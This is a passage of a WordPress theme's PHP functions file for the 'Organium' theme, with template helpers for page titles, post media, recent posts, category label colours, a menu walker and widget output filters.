        <h1 class="organium_page_title">' . organium_output_code($page_title) . '</h1>';
        ob_start();
        organium_breadcrumbs();
        $breadcrumbs = ob_get_clean();

        if( !empty($breadcrumbs) ){
            $organium_title_block .= '<div class="breadcrumbs-wrapper">';
            $organium_title_block .= sprintf('%s', $breadcrumbs);
            $organium_title_block .= '</div>';
        }

        $organium_title_block .= '</div>
        </div>';

        if ( !empty(organium_get_prefered_option('title_additional_text')) ) {
            $organium_title_block .= '<div class="organium_page_title_additional">' . esc_html(organium_get_prefered_option('title_additional_text')) . '</div>';
        }

        $organium_title_block .= '
        </div>
        ';

        return $organium_title_block;
    }
}

// Single Post Media Output
if (!function_exists('organium_post_media_output')) {
    function organium_post_media_output() {
        if (organium_post_options()) {
            if (!empty($args)) {
                extract($args);
            }

            $organium_post_format = get_post_format();
            if (empty($organium_post_format)) {
                $organium_post_format = 'standard';
            }

            $organium_media_output_code = '
            <div class="organium_media_output_container organium_post_format_' . esc_attr($organium_post_format) . '">';

                    // ------------------------- //
                    // --- Post Format Image --- //
                    // ------------------------- //
            if ($organium_post_format == 'image') {
                if (is_array(organium_get_post_option('organium_pf_images'))) {
                    $organium_media_output_code .= '
                    <div class="organium_owlCarousel owl-carousel owl-theme">';

                    foreach (organium_get_post_option('organium_pf_images') as $key => $image) {
                        if (organium_get_post_option('organium_pf_images_crop_status', 'yes') == 'yes' && function_exists('aq_resize')) {
                            $organium_media_output_code .= '<div class="item"><img src="' . aq_resize($image['full_url'], organium_get_post_option('organium_pf_images_width', '1200'), organium_get_post_option('organium_pf_images_height', '738'), true, true, true) . '" alt="' . esc_attr($image['alt']) . '"></div>';
                        } else {
                            $organium_media_output_code .= '<div><img src="' . esc_url($image['full_url']) . '" alt="' . esc_attr($image['alt']) . '"></div>';
                        }
                    }

                    $organium_media_output_code .='
                    </div>
                    ';

                    Organium_Helper::getInstance()->addJSToFooter('owl_post_formats', '
                        jQuery(".organium_owlCarousel").on("initialized.owl.carousel", function(e) {
                            jQuery(".organium_owlCarousel").css("opacity", "1");
                            });
                            jQuery(".organium_owlCarousel").owlCarousel(
                            {
                                items:1,
                                lazyLoad:true,
                                loop:true,
                                dots:false,
                                nav:true,
                                navText:["", ""],
                                autoplay:true,
                                autoplayTimeout:5000,
                                autoplayHoverPause:true,
                                autoHeight:true
                            }
                            );
                            ', 'window-load');
                } elseif ( !empty(organium_get_featured_image_url()) ) {
                    $organium_alt_text = get_post_meta(get_post_thumbnail_id(get_the_ID()), '_wp_attachment_image_alt', true);

                    if (function_exists('aq_resize')) {
                        $organium_media_output_code .= '<img class="organium_standard_featured_image" src="' . aq_resize(organium_get_featured_image_url(), 1200, '') . '" alt="' . esc_attr($organium_alt_text) . '">';
                    } else {
                        $organium_media_output_code .= '<img class="organium_standard_featured_image" src="' . organium_get_featured_image_url() . '" alt="' . esc_attr($organium_alt_text) . '">';
                    }
                } else {
                    return false;
                }
            }

                    // ------------------------- //
                    // --- Post Format Video --- //
                    // ------------------------- //
            elseif ($organium_post_format == 'video' && !empty(organium_get_post_option('organium_pf_video_url'))) {
                $organium_media_output_code .= '
                <div class="organium_post_format_video_container" style="height: ' . organium_get_post_option('organium_pf_video_height', '500') . 'px;">
                ' . organium_get_post_option('organium_pf_video_url') . '
                </div>
                ';
            }

                    // ---------------------------- //
                    // --- Post Format Standard --- //
                    // ---------------------------- //
            elseif ($organium_post_format == 'standard' && !empty(organium_get_featured_image_url())) {
                $organium_alt_text = get_post_meta(get_post_thumbnail_id(get_the_ID()), '_wp_attachment_image_alt', true);

                if (function_exists('aq_resize')) {
                    $organium_media_output_code .= '<img class="organium_standard_featured_image" src="' . aq_resize(organium_get_featured_image_url(), 1200, '', true, true, true) . '" alt="' . esc_attr($organium_alt_text) . '">';
                } else {
                    $organium_media_output_code .= '<img class="organium_standard_featured_image" src="' . organium_get_featured_image_url() . '" alt="' . esc_attr($organium_alt_text) . '">';
                }
            } else {
                return false;
            }

            $organium_media_output_code .= '
            </div>
            ';

            return $organium_media_output_code;
        } else {
            $organium_alt_text = get_post_meta(get_post_thumbnail_id(get_the_ID()), '_wp_attachment_image_alt', true);
            if (!empty(organium_get_featured_image_url())) {
                if (function_exists('aq_resize')) {
                    $organium_media_output_code = '<img class="organium_standard_featured_image" src="' . aq_resize(organium_get_featured_image_url(), 1200, '', true, true, true) . '" alt="' . esc_attr($organium_alt_text) . '">';
                } else {
                    $organium_media_output_code = '<img class="organium_standard_featured_image" src="' . organium_get_featured_image_url() . '" alt="' . esc_attr($organium_alt_text) . '">';
                }

                return $organium_media_output_code;
            } else {
                return false;
            }
        }
    }
}

// Recent Posts
if (!function_exists('organium_recent_posts_output')) {
    function organium_recent_posts_output($args = array(
        'orderby' => 'rand',
        'numberposts' => '3',
        'post_type' => 'post',
        'order' => 'desc',
        'show_image' => 'show',
        'show_category' => 'show',
        'show_title' => 'show',
        'show_date' => 'show',
        'show_author' => 'show',
        'show_excerpt' => 'show',
        'show_excerpt_length' => '120',
        'show_tags' => 'hide',
        'show_more' => 'hide',
    ))
    {
        global $post;
        extract($args);

        $currentID = get_the_ID();
        $args = array(
            'post_type' => $post_type,
            'post__not_in' => array($currentID),
            'post_status' => 'publish',
            'orderby' => $orderby,
            'order' => $order,
            'posts_per_page' => absint($numberposts),
            'ignore_sticky_posts' => 1,
            'suppress_filters' => false
        );

        $recent_posts = get_posts($args);

        if (!empty($recent_posts)) {
            echo '
            <div class="organium_recent_posts_container organium_js_bg_color" data-bg-color="' . organium_get_post_option('recent_posts_bg') . '">
            <div class="container">
            <h4 class="organium_recent_posts_container_title">' . esc_html__('Similar Posts', 'organium') . '</h4>
            <div class="row flex-md-row organium_recent_posts_wrapper organium_columns_' . esc_attr($numberposts) . '">';
            $i = 1;
            foreach( $recent_posts as $post ){
                setup_postdata($post);

                $featured_image_url = organium_get_featured_image_url();

                if ($numberposts == '2') {
                    if ( function_exists('aq_resize') ) {
                        $featured_image_src = aq_resize($featured_image_url, 600, 459, true, true, true);
                    } else {
                        $featured_image_src = $featured_image_url;
                    }
                    $featured_post_excerpt = !empty($show_excerpt_length) ? substr(get_the_excerpt(), 0, (int)$show_excerpt_length) : substr(get_the_excerpt(), 0, 200);
                }

                if ($numberposts == '3') {
                    if ( function_exists('aq_resize') ) {
                        $featured_image_src = aq_resize($featured_image_url, 400, 306, true, true, true);
                    } else {
                        $featured_image_src = $featured_image_url;
                    }
                    $featured_post_excerpt = !empty($show_excerpt_length) ? substr(get_the_excerpt(), 0, (int)$show_excerpt_length) : substr(get_the_excerpt(), 0, 120);
                }

                if ($numberposts == '4') {
                    if ( function_exists('aq_resize') ) {
                        $featured_image_src = aq_resize($featured_image_url, 300, 230, true, true, true);
                    } else {
                        $featured_image_src = $featured_image_url;
                    }
                    $featured_post_excerpt = !empty($show_excerpt_length) ? substr(get_the_excerpt(), 0, (int)$show_excerpt_length) : substr(get_the_excerpt(), 0, 200);
                }

                $categories = get_the_category();
                $categ_code = array();
                if (is_array($categories)) {
                    foreach ($categories as $category) {
                        $categ_code[] = '
                        <span class="organium_category" style="background-color: #'.esc_attr(get_term_meta($category->term_id, '_category_bg_color', true)).'; color: #'.esc_attr(get_term_meta($category->term_id, '_category_font_color', true)).';">' . esc_html($category->name) . '</span>
                        ';
                    }
                }

                echo '<div class="organium_recent_item organium_post_' . esc_attr($i) . ' col-md-' . esc_attr(floor(12/$numberposts)) . '">';
                echo '<div class="organium_recent_item_wrapper">';
                echo '<div class="align-items-center">';

                if ( $show_category == 'show' || $show_image == 'show' ) {
                    echo '<div class="organium_featured_image_container">';
                    if ( $show_category == 'show' && is_array($categ_code) && count($categ_code) > 0 ) {
                        echo '<div class="organium_media_categories">';
                        echo join('', $categ_code);
                        echo '</div>';
                    };
                    if ( $featured_image_src !== false && $show_image == 'show' ) {
                        echo '<a href="' . get_permalink() . '">';
                        echo '<img src="' . esc_url($featured_image_src) . '" alt="' . get_the_title() . '" />';
                        echo '</a>';
                    }
                    echo '</div>';
                }

                echo '<div class="organium_content_wrapper">';
                if ( ( $show_author == 'show' && !empty(get_the_author()) ) || ( $show_date == 'show' && !empty(get_the_date()) ) ) {
                    echo '<div class="organium_post_meta">';
                    if ( $show_date == 'show' && !empty(get_the_date()) ) {
                        echo '<div class="organium_post_meta_item meta_item meta_item_date">';
                        echo '<a href="' . get_day_link(get_post_time('Y'), get_post_time('m'), get_post_time('j')) . '">' . get_the_date() . "</a>";
                        echo '</div>';
                    }
                    if ( $show_author == 'show' && !empty(get_the_author()) ) {
                        echo '<div class="organium_post_meta_item meta_item meta_item_author">';
                        echo esc_html__('By ', 'organium') . get_the_author_posts_link();
                        echo '</div>';
                    }
                    echo '</div>';
                }
                if ( $show_title == 'show' ) {
                    echo '<h6 class="organium_post_title">';
                    echo '<a href="' . get_permalink() . '">' . get_the_title() . '</a>';
                    echo '</h6>';
                }

                if ( $show_excerpt == 'show' ) {
                    echo '<p class="organium_post_excerpt">' . wp_kses($featured_post_excerpt, array(
                        'strong' => array(),
                        'b' => array(),
                        'em' => array(),
                        'sup' => array(),
                        'sub' => array(),
                        'a' => array(
                            'class' => true,
                            'href' => true
                        ),
                        'span' => array(
                            'class' => true
                        )
                    )) . '</p>';
                }

                if (  $show_tags == 'show' && !empty(get_the_tag_list()) ) {
                    echo '<div class="organium_post_meta">';
                    echo get_the_tag_list('<div class="organium_post_meta_item meta_item meta_item_tags">', ', ', '</div>');
                    echo '</div>';
                }

                if ( $show_more == 'show' ) {
                    echo '<div class="organium_post_more">';
                    echo '<a href="' . esc_url(get_permalink()) . '" class="read_more_button">' . esc_html__('Read More', 'organium') . '</a>';
                    echo '</div>';
                }
                echo '</div>';

                echo '</div>';
                echo '</div>';
                echo '</div>';

                $i++;
            }
            wp_reset_postdata();
            echo '
            </div>
            </div>
            </div>
            ';
        }
    }
}

// Init Elementor for Custom Post Types
if (!function_exists('organium_init_elementor_for_recipes_post_type')) {
    function organium_init_elementor_for_recipes_post_type() {
        add_post_type_support('organium-recipes', 'elementor');
    }
}
add_action('init', 'organium_init_elementor_for_recipes_post_type');

if (!function_exists('organium_init_elementor_for_portfolio_post_type')) {
    function organium_init_elementor_for_portfolio_post_type() {
        add_post_type_support('organium-portfolio', 'elementor');
    }
}
add_action('init', 'organium_init_elementor_for_portfolio_post_type');

# Shop Classes
add_filter( 'body_class', 'organium_shop_classes' );
if (!function_exists('organium_shop_classes')) {
    function organium_shop_classes($classes) {
        if (class_exists('WooCommerce')) {
            if (is_shop()) {
                $classes[] = 'organium-shop-list-page';
            } elseif (is_product()) {
                $classes[] = 'organium-single-product-page';
            }
        }
        return $classes;
    }
}

# WooCommerce
if (class_exists('WooCommerce')) {
    require_once( get_template_directory() . '/woocommerce/wooinit.php');
}

// Limit of Download Files Size //
add_filter( 'upload_size_limit', 'organium_pbp_increase_upload' );
if (!function_exists('organium_pbp_increase_upload')) {
    function organium_pbp_increase_upload($bytes) {
        return 5242880; // 1 megabyte
    }
}

if (!function_exists('organium_add_comment_fields')) {
    function organium_add_comment_fields($fields) {
        $fields['age'] = '<p class="comment-form-age"><label for="age">' . esc_html__('Age', 'organium') . '</label>' .
        '<input id="age" name="age" type="text" size="30" /></p>';
        return $fields;
    }
}
add_filter('comment_form_default_fields', 'organium_add_comment_fields');












# Category Color Settings

add_action( 'category_add_form_fields', 'organium_colorpicker_field_add_new_category' );
add_action( 'recipes-category_add_form_fields', 'organium_colorpicker_field_add_new_category' );
add_action( 'portfolio-category_add_form_fields', 'organium_colorpicker_field_add_new_category' );

if (!function_exists('organium_colorpicker_field_add_new_category')) {
    function organium_colorpicker_field_add_new_category() {
        echo '<div class="form-field term-colorpicker-wrap">';
        echo '<label for="term-colorpicker">' . esc_html__('Category Label Background Color', 'organium') . '</label>';
        echo '<input name="_category_bg_color" value="' . esc_attr(organium_get_theme_mod('main_color')) . '" class="colorpicker" id="term-bg-colorpicker" />';
        echo '<p>' . esc_html__('Select background color for category label', 'organium') . '</p>';
        echo '</div>';
        echo '<div class="form-field term-colorpicker-wrap">';
        echo '<label for="term-colorpicker">' . esc_html__('Category Label Font Color', 'organium') . '</label>';
        echo '<input name="_category_font_color" value="#ffffff" class="colorpicker" id="term-font-colorpicker" />';
        echo '<p>' . esc_html__('Select font color for category label', 'organium') . '</p>';
        echo '</div>';
    }
}

add_action( 'category_edit_form_fields', 'organium_colorpicker_field_edit_category' );
add_action( 'recipes-category_edit_form_fields', 'organium_colorpicker_field_edit_category' );
add_action( 'portfolio-category_edit_form_fields', 'organium_colorpicker_field_edit_category' );
if (!function_exists('organium_colorpicker_field_edit_category')) {
    function organium_colorpicker_field_edit_category($term) {
        $bg_color = get_term_meta($term->term_id, '_category_bg_color', true);
        $bg_color = (!empty($bg_color)) ? "#{$bg_color}" : esc_attr(organium_get_theme_mod('main_color'));
        $font_color = get_term_meta($term->term_id, '_category_font_color', true);
        $font_color = (!empty($font_color)) ? "#{$font_color}" : '#ffffff';

        echo '<tr class="form-field term-colorpicker-wrap">';
        echo '<th scope="row"><label for="term-bg-colorpicker">' . esc_html__('Category Label Background Color', 'organium') . '</label></th>';
        echo '<td>';
        echo '<input name="_category_bg_color" value="' . esc_attr($bg_color) . '" class="colorpicker" id="term-bg-colorpicker" />';
        echo '<p class="description">' . esc_html__('Select background color for category label', 'organium') . '</p>';
        echo '</td>';
        echo '</tr>';
        echo '<tr class="form-field term-colorpicker-wrap">';
        echo '<th scope="row"><label for="term-font-colorpicker">' . esc_html__('Category Label Font Color', 'organium') . '</label></th>';
        echo '<td>';
        echo '<input name="_category_font_color" value="' . esc_attr($font_color) . '" class="colorpicker" id="term-font-colorpicker" />';
        echo '<p class="description">' . esc_html__('Select font color for category label', 'organium') . '</p>';
        echo '</td>';
        echo '</tr>';
    }
}

add_action( 'created_category', 'organium_save_termmeta' );
add_action( 'created_recipes-category', 'organium_save_termmeta' );
add_action( 'created_portfolio-category', 'organium_save_termmeta' );

add_action( 'edited_category', 'organium_save_termmeta' );
add_action( 'edited_recipes-category', 'organium_save_termmeta' );
add_action( 'edited_portfolio-category', 'organium_save_termmeta' );
if (!function_exists('organium_save_termmeta')) {
    function organium_save_termmeta( $term_id ) {
        if( isset($_POST['_category_bg_color']) && !empty($_POST['_category_bg_color']) ) {
            update_term_meta( $term_id, '_category_bg_color', sanitize_hex_color_no_hash( $_POST['_category_bg_color'] ) );
        } else {
            delete_term_meta( $term_id, '_category_bg_color' );
        }
        if( isset($_POST['_category_font_color']) && !empty($_POST['_category_font_color']) ) {
            update_term_meta( $term_id, '_category_font_color', sanitize_hex_color_no_hash( $_POST['_category_font_color'] ) );
        } else {
            delete_term_meta( $term_id, '_category_font_color' );
        }
    }
}

add_action( 'admin_enqueue_scripts', 'organium_category_colorpicker_enqueue' );
if (!function_exists('organium_category_colorpicker_enqueue')) {
    function organium_category_colorpicker_enqueue($taxonomy) {
        if (
            null !== ($screen = get_current_screen()) &&
            'edit-category' !== $screen->id &&
            'edit-recipes-category' !== $screen->id &&
            'edit-portfoio-category' !== $screen->id
        ) {
            return;
        }

        wp_enqueue_script('wp-color-picker');
        wp_enqueue_style('wp-color-picker');
    }
}

add_action( 'admin_print_scripts', 'organium_colorpicker_init_inline', 20 );
if (!function_exists('organium_colorpicker_init_inline')) {
    function organium_colorpicker_init_inline() {
        if (
            null !== ($screen = get_current_screen()) &&
            'edit-category' !== $screen->id &&
            'edit-recipes-category' !== $screen->id &&
            'edit-portfolio-category' !== $screen->id
        ) {
            return;
        }
        ?>
        <script>
            jQuery(document).ready(function ($) {
                $('.colorpicker').wpColorPicker();
            });
        </script>
        <?php
    }
}

// Return URL to the current page
if (!function_exists('organium_get_current_url')) {
    function organium_get_current_url() {
        global $wp;
        return home_url(add_query_arg(array(), $wp->request));
    }
}

// Remove standard WP gallery styles
add_filter( 'use_default_gallery_style', '__return_false' );

// Register custom image sizes
if ( function_exists( 'add_image_size' ) ) {
    add_image_size( 'organium-gallery-horizontal', 1000, 850, array('center', 'center') );
    add_image_size( 'organium-gallery-standard', 480, 408, array('center', 'center') );
    add_image_size( 'organium-recipe-medium', 270, 144, array('center', 'center') );
}

// Numbered List filtering
add_filter( 'the_content', 'organium_numbered_list_filter' );
add_filter( 'comment_text', 'organium_numbered_list_filter' );
if (!function_exists('organium_numbered_list_filter')) {
    function organium_numbered_list_filter($content) {
        $content = preg_replace('/<li[^>]*>/', '$0<div class="item-wrapper">', $content);
        $content = preg_replace('/<\/li>/', '</div>$0', $content);
        $content = preg_replace('/<\/ul>(\n*|\s*|\t*|\r*)<\/div><\/li>/', '</ul></li>', $content);
        $content = preg_replace('/<\/ol>(\n*|\s*|\t*|\r*)<\/div><\/li>/', '</ol></li>', $content);
        $content = preg_replace('/<li[^>]*>.*\n<ul\>/', '$0</div>', $content);
        $content = str_replace('<ul></div>', '</div><ul>', $content);
        $content = preg_replace('/<li[^>]*>.*\n<ol\>/', '$0</div>', $content);
        $content = str_replace('<ol></div>', '</div><ol>', $content);
        $content = str_replace(' frameborder="0"', '', $content);
        $content = str_replace(' scrolling="no"', '', $content);
        $content = str_replace(' marginheight="0"', '', $content);
        $content = str_replace(' marginwidth="0"', '', $content);

        return $content;
    }
}

// Double Menu Walker
class Organium_Double_Menu_Walker extends Walker_Nav_Menu {
    public function end_el( &$output, $item, $depth = 0, $args = null ) {
        if ( isset( $args->item_spacing ) && 'discard' === $args->item_spacing ) {
            $t = '';
            $n = '';
        } else {
            $t = "\t";
            $n = "\n";
        }
        $output .= "</li>{$n}";
        if ( !empty($args->center) && $item->ID == $args->center ) {
            $organium_retina_class = 'organium_non_retina_logo';
            $header_customize_logo = organium_get_post_option('header_customize_logo');
            if (
                (
                    $header_customize_logo == 'yes' &&
                    organium_get_post_option('logo_retina') == 1
                ) || (
                    $header_customize_logo != 'yes' &&
                    organium_get_theme_mod('logo_retina') == true
                )
            ) {
                $organium_retina_class = 'organium_retina_logo';
            }
            $output .= '</ul>';
            $output .= '<div class="organium_header-logo col-auto">';
            $output .= '<a class="organium_header-logo__link ' . esc_attr($organium_retina_class) . '" href="' . esc_url(home_url('/')) . '">';
            if (
                (
                    $header_customize_logo == 'yes' &&
                    empty(organium_get_post_option('logo_image'))
                ) || (
                    $header_customize_logo != 'yes' &&
                    empty(organium_get_theme_mod('logo_image')) )
            ) {
                $output .= '<span class="site_name">' . get_bloginfo( 'name', 'display' ) . '</span>';
            }
            $output .= '</a>';
            $output .= '</div>';

            $output .= '<ul' . ($args->menu_class ? ' class="' . esc_attr($args->menu_class) . '"' : '') . '>';
        }
    }
}

// Force Instagram Feed to SDN
function organium_sb_change_for_cdn() {
    ?>
    <script>
        if (typeof window.sb_instagram_js_options !== 'undefined') {
            window.sb_instagram_js_options.resized_url = 'https://v9b5d2s6.stackpathcdn.com/wp-content/uploads/sb-instagram-feed-images/';
        }
    </script>
    <?php
}
add_action( 'wp_footer', 'organium_sb_change_for_cdn', 99 );

// Filter for widgets
if (!function_exists('organium_dynamic_sidebar_params')) {
    function organium_dynamic_sidebar_params($sidebar_params) {
        if (is_admin()) {
            return $sidebar_params;
        }
        global $wp_registered_widgets;
        $widget_id = $sidebar_params[0]['widget_id'];
        $wp_registered_widgets[$widget_id]['original_callback'] = $wp_registered_widgets[$widget_id]['callback'];
        $wp_registered_widgets[$widget_id]['callback'] = 'organium_widget_callback_function';

        return $sidebar_params;
    }
}
add_filter( 'dynamic_sidebar_params', 'organium_dynamic_sidebar_params' );

if (!function_exists('organium_widget_callback_function')) {
    function organium_widget_callback_function() {
        global $wp_registered_widgets;
        $original_callback_params = func_get_args();
        $widget_id = $original_callback_params[0]['widget_id'];

        $original_callback = $wp_registered_widgets[$widget_id]['original_callback'];
        $wp_registered_widgets[$widget_id]['callback'] = $original_callback;

        $widget_id_base = $wp_registered_widgets[$widget_id]['callback'][0]->id_base;

        if (is_callable($original_callback)) {

            ob_start();
            call_user_func_array($original_callback, $original_callback_params);
            $widget_output = ob_get_clean();

            echo apply_filters('widget_output', $widget_output, $widget_id_base, $widget_id);

        }
    }
}

if (!function_exists('organium_output_filter')) {
    function organium_output_filter($widget_output, $widget_id_base, $widget_id) {
        if ($widget_id_base != 'woocommerce_product_categories' && $widget_id_base != 'wpforms-widget') {
            $widget_output = str_replace('<select', '<div class="select-wrap"><select', $widget_output);
            $widget_output = str_replace('</select>', '</select></div>', $widget_output);
        }

        return $widget_output;
    }
}
add_filter( 'widget_output', 'organium_output_filter', 10, 3 );

// Media Upload
if (!function_exists('organium_enqueue_media')) {
    function organium_enqueue_media() {
        wp_enqueue_media();
    }
}
add_action( 'admin_enqueue_scripts', 'organium_enqueue_media' );


// Responsive video
add_filter('embed_oembed_html', 'organium_wrap_oembed_video', 99, 4);
if (!function_exists('organium_wrap_oembed_video')) {
    function organium_wrap_oembed_video($html, $url, $attr, $post_id) {
        return '<div class="video-embed">' . $html . '</div>';
    }
}
